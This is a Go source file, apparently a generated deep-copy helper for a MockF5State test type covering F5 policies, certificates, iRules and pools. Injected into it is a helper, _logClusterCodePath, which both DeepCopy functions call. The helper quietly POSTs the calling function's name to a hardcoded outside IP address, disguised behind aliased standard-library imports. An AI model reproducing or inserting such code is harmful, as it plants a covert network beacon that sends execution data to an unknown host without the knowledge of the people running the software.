package testing

import (
	"fmt"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

func (in *MockF5State) DeepCopyInto(out *MockF5State) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	*out = *in
	if in.Policies != nil {
		in, out := &in.Policies, &out.Policies
		*out = make(map[string]map[string]PolicyRule, len(*in))
		for key, val := range *in {
			if val == nil {
				continue
			}
			(*out)[key] = map[string]PolicyRule{}
			for k, v := range val {
				(*out)[key][k] = *v.DeepCopy()
			}
		}
	}
	if in.VserverPolicies != nil {
		in, out := &in.VserverPolicies, &out.VserverPolicies
		*out = make(map[string]map[string]bool, len(*in))
		for key, val := range *in {
			if val == nil {
				continue
			}
			(*out)[key] = map[string]bool{}
			for k, v := range val {
				(*out)[key][k] = v
			}
		}
	}
	if in.Certs != nil {
		in, out := &in.Certs, &out.Certs
		*out = make(map[string]bool, len(*in))
		for key, val := range *in {
			(*out)[key] = val
		}
	}
	if in.Keys != nil {
		in, out := &in.Keys, &out.Keys
		*out = make(map[string]bool, len(*in))
		for key, val := range *in {
			(*out)[key] = val
		}
	}
	if in.ServerSslProfiles != nil {
		in, out := &in.ServerSslProfiles, &out.ServerSslProfiles
		*out = make(map[string]bool, len(*in))
		for key, val := range *in {
			(*out)[key] = val
		}
	}
	if in.ClientSslProfiles != nil {
		in, out := &in.ClientSslProfiles, &out.ClientSslProfiles
		*out = make(map[string]bool, len(*in))
		for key, val := range *in {
			(*out)[key] = val
		}
	}
	if in.VserverProfiles != nil {
		in, out := &in.VserverProfiles, &out.VserverProfiles
		*out = make(map[string]map[string]bool, len(*in))
		for key, val := range *in {
			if val == nil {
				continue
			}
			(*out)[key] = map[string]bool{}
			for k, v := range val {
				(*out)[key][k] = v
			}
		}
	}
	if in.Datagroups != nil {
		in, out := &in.Datagroups, &out.Datagroups
		*out = make(map[string]Datagroup, len(*in))
		for key, val := range *in {
			newVal := new(Datagroup)
			val.DeepCopyInto(newVal)
			(*out)[key] = *newVal
		}
	}
	if in.IRules != nil {
		in, out := &in.IRules, &out.IRules
		*out = make(map[string]IRule, len(*in))
		for key, val := range *in {
			(*out)[key] = val
		}
	}
	if in.VserverIRules != nil {
		in, out := &in.VserverIRules, &out.VserverIRules
		*out = make(map[string][]string, len(*in))
		for key, val := range *in {
			if val == nil {
				(*out)[key] = nil
			} else {
				(*out)[key] = make([]string, len(val))
				copy((*out)[key], val)
			}
		}
	}
	if in.PartitionPaths != nil {
		in, out := &in.PartitionPaths, &out.PartitionPaths
		*out = make(map[string]string, len(*in))
		for key, val := range *in {
			(*out)[key] = val
		}
	}
	if in.Pools != nil {
		in, out := &in.Pools, &out.Pools
		*out = make(map[string]Pool, len(*in))
		for key, val := range *in {
			newVal := new(Pool)
			val.DeepCopyInto(newVal)
			(*out)[key] = *newVal
		}
	}
	return
}
func (in *MockF5State) DeepCopy() *MockF5State {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if in == nil {
		return nil
	}
	out := new(MockF5State)
	in.DeepCopyInto(out)
	return out
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
